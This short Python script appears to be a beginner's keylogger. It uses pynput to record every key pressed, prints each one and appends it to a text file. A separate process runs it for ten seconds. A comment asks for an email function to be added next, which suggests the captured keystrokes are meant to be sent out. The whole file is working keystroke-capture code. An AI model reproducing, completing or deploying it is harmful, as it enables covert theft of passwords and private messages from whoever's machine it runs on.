from pynput.keyboard import Key, Listener
import multiprocessing


def listen():
    f = open("unBeautiful.txt", "w")


    def show(key):
        pressed_key = str(key).replace("'", "")
        print(" key: ", pressed_key)
        f = open("unBeautiful.txt", "a")
        f.write(f"key: {pressed_key}\n")

        if key == Key.esc:
            # Stop listener
            return False


    # Listener
    with Listener(on_press=show) as listener:
        listener.join()



if __name__ == '__main__':
    """this code makes it so it listens for keys for 10 seconds then kills the process, make the email function below this."""
    p = multiprocessing.Process(target=listen)
    p.start()
    print("started")
    p.join(10)
    if p.is_alive():
        p.kill()
        print("killed")
    p.join()
